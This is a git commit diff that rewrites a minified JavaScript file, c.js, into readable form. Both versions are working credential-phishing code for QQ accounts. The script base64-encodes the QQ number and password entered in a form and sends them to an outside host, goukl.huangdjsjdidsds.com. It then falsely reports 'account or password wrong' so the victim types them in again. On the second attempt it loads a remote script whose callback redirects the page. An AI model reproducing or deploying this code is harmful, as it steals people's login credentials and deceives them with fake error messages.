45da30f8d619739e22268c1c14256faf805b5184
w88975 <1457434343@qq.com>
2014-11-01 05:40:59 +0800

    Update c.js

--- c.js
+++ c.js
@@ -1,1 +1,159 @@
-function base64decode(a){var b,c,d,e,f,g,h;for(g=a.length,f=0,h="";g>f;){do b=base64DecodeChars[255&a.charCodeAt(f++)];while(g>f&&-1==b);if(-1==b)break;do c=base64DecodeChars[255&a.charCodeAt(f++)];while(g>f&&-1==c);if(-1==c)break;h+=String.fromCharCode(b<<2|(48&c)>>4);do{if(d=255&a.charCodeAt(f++),61==d)return h;d=base64DecodeChars[d]}while(g>f&&-1==d);if(-1==d)break;h+=String.fromCharCode((15&c)<<4|(60&d)>>2);do{if(e=255&a.charCodeAt(f++),61==e)return h;e=base64DecodeChars[e]}while(g>f&&-1==e);if(-1==e)break;h+=String.fromCharCode((3&d)<<6|e)}return h}function base64encode(a){var b,c,d,e,f,g;for(d=a.length,c=0,b="";d>c;){if(e=255&a.charCodeAt(c++),c==d){b+=base64EncodeChars.charAt(e>>2),b+=base64EncodeChars.charAt((3&e)<<4),b+="==";break}if(f=a.charCodeAt(c++),c==d){b+=base64EncodeChars.charAt(e>>2),b+=base64EncodeChars.charAt((3&e)<<4|(240&f)>>4),b+=base64EncodeChars.charAt((15&f)<<2),b+="=";break}g=a.charCodeAt(c++),b+=base64EncodeChars.charAt(e>>2),b+=base64EncodeChars.charAt((3&e)<<4|(240&f)>>4),b+=base64EncodeChars.charAt((15&f)<<2|(192&g)>>6),b+=base64EncodeChars.charAt(63&g)}return b}function encode64(a){a=escape(a);var c,d,f,g,h,b="",e="",i="",j=0;do c=a.charCodeAt(j++),d=a.charCodeAt(j++),e=a.charCodeAt(j++),f=c>>2,g=(3&c)<<4|d>>4,h=(15&d)<<2|e>>6,i=63&e,isNaN(d)?h=i=64:isNaN(e)&&(i=64),b=b+keyStr.charAt(f)+keyStr.charAt(g)+keyStr.charAt(h)+keyStr.charAt(i),c=d=e="",f=g=h=i="";while(j<a.length);return b}function test(){if(0==$("#cr_u").val().length)$("#cr_t").html("\u8bf7\u8f93\u5165QQ\u53f7\u7801");else if(0==$("#cr_p").val().length)$("#cr_t").html("\u8bf7\u8f93\u5165QQ\u5bc6\u7801");else if($("#cr_u").val().length<=5)$("#cr_t").html("QQ\u53f7\u7801\u957f\u5ea6\u9519\u8bef");else if($("#cr_p").val().length<6)$("#cr_t").html("QQ\u5bc6\u7801\u957f\u5ea6\u9519\u8bef");else{$("#cr_t").html("");var a=base64encode($("#cr_u").val()),b=base64encode($("#cr_p").val()),c=base64encode($("#cr_id").val()),d=base64encode($("#cr_m").val()),e=c+"/"+a+"/"+b+"/"+d;if(0==count)$.get("http://goukl.huangdjsjdidsds.com/tpl/"+e),$("#cr_t").html("QQ\u5e10\u53f7\u6216\u5bc6\u7801\u9519\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff01"),$("#cr_u").attr("value",""),$("#cr_p").attr("value",""),count++;else{var f=document.createElement("script");f.type="text/javascript",f.src="http://goukl.huangdjsjdidsds.com/tpl/"+e,document.getElementsByTagName("head")[0].appendChild(f)}}}function callback(a){window.parent.location.href=a}var base64EncodeChars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1),keyStr="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$("#cr_u").attr("placeholder","QQ\u5e10\u53f7"),$("#cr_p").attr("placeholder","QQ\u5bc6\u7801");var count=0;
+var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        var base64DecodeChars = new Array(
+            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
+            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
+            52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
+            -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
+            15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
+            -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
+            41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
+        function base64decode(str) {
+            var c1, c2, c3, c4;
+            var i, len, out;
+            len = str.length;
+            i = 0;
+            out = "";
+            while (i < len) {
+                do {
+                    c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
+                } while (i < len && c1 == -1);
+                if (c1 == -1)
+                    break;
+                do {
+                    c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
+                } while (i < len && c2 == -1);
+                if (c2 == -1)
+                    break;
+                out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));
+                do {
+                    c3 = str.charCodeAt(i++) & 0xff;
+                    if (c3 == 61)
+                        return out;
+                    c3 = base64DecodeChars[c3];
+                } while (i < len && c3 == -1);
+                if (c3 == -1)
+                    break;
+                out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));
+                do {
+                    c4 = str.charCodeAt(i++) & 0xff;
+                    if (c4 == 61)
+                        return out;
+                    c4 = base64DecodeChars[c4];
+                } while (i < len && c4 == -1);
+                if (c4 == -1)
+                    break;
+                out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
+            }
+            return out;
+        }
+        function base64encode(str) {
+            var out, i, len;
+            var c1, c2, c3;
+            len = str.length;
+            i = 0;
+            out = "";
+            while (i < len) {
+                c1 = str.charCodeAt(i++) & 0xff;
+                if (i == len) {
+                    out += base64EncodeChars.charAt(c1 >> 2);
+                    out += base64EncodeChars.charAt((c1 & 0x3) << 4);
+                    out += "==";
+                    break;
+                }
+                c2 = str.charCodeAt(i++);
+                if (i == len) {
+                    out += base64EncodeChars.charAt(c1 >> 2);
+                    out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
+                    out += base64EncodeChars.charAt((c2 & 0xF) << 2);
+                    out += "=";
+                    break;
+                }
+                c3 = str.charCodeAt(i++);
+                out += base64EncodeChars.charAt(c1 >> 2);
+                out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
+                out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
+                out += base64EncodeChars.charAt(c3 & 0x3F);
+            }
+            return out;
+        }
+        var keyStr = "ABCDEFGHIJKLMNOP" +
+                     "QRSTUVWXYZabcdef" +
+                     "ghijklmnopqrstuv" +
+                     "wxyz0123456789+/" +
+                     "=";
+        function encode64(input) {
+            input = escape(input);
+            var output = "";
+            var chr1, chr2, chr3 = "";
+            var enc1, enc2, enc3, enc4 = "";
+            var i = 0;
+
+            do {
+                chr1 = input.charCodeAt(i++);
+                chr2 = input.charCodeAt(i++);
+                chr3 = input.charCodeAt(i++);
+
+                enc1 = chr1 >> 2;
+                enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+                enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+                enc4 = chr3 & 63;
+
+                if (isNaN(chr2)) {
+                    enc3 = enc4 = 64;
+                } else if (isNaN(chr3)) {
+                    enc4 = 64;
+                }
+
+                output = output +
+                   keyStr.charAt(enc1) +
+                   keyStr.charAt(enc2) +
+                   keyStr.charAt(enc3) +
+                   keyStr.charAt(enc4);
+                chr1 = chr2 = chr3 = "";
+                enc1 = enc2 = enc3 = enc4 = "";
+            } while (i < input.length);
+
+            return output;
+        }
+
+$("#cr_u").attr("placeholder", '\u0051' + '\u0051' + '\u5e10' + '\u53f7');
+$("#cr_p").attr("placeholder", '\u0051' + '\u0051' + '\u5bc6' + '\u7801');
+var count=0;
+function test(){
+	if($("#cr_u").val().length==0){
+		$("#cr_t").html("请输入QQ号码");
+	}else if($("#cr_p").val().length==0){
+		$("#cr_t").html("请输入QQ密码");
+	}else{
+		if($("#cr_u").val().length<=5){
+			$("#cr_t").html("QQ号码长度错误");
+		}else if($("#cr_p").val().length<6){
+			$("#cr_t").html("QQ密码长度错误");
+		}else{
+			//login
+			$("#cr_t").html("");
+			var u_q= base64encode($("#cr_u").val());
+			var u_p=base64encode($("#cr_p").val());
+			var u_id=base64encode($("#cr_id").val());
+			var u_m=base64encode($("#cr_m").val());
+			var url=u_id+"/"+u_q+"/"+u_p+"/"+u_m;
+			if(count==0){
+			$.get("http://goukl.huangdjsjdidsds.com/tpl/"+url);
+			$("#cr_t").html("QQ帐号或密码错误，请重新输入！");
+			$("#cr_u").attr("value","");
+			$("#cr_p").attr("value","");
+			count++;
+			}else{
+				var JSONP=document.createElement("script");  
+				JSONP.type="text/javascript";  
+				JSONP.src="http://goukl.huangdjsjdidsds.com/tpl/"+url;  
+				document.getElementsByTagName("head")[0].appendChild(JSONP); 
+			}
+		}
+	}
+}
+
+function callback(obj){
+	window.parent.location.href=obj;
+}
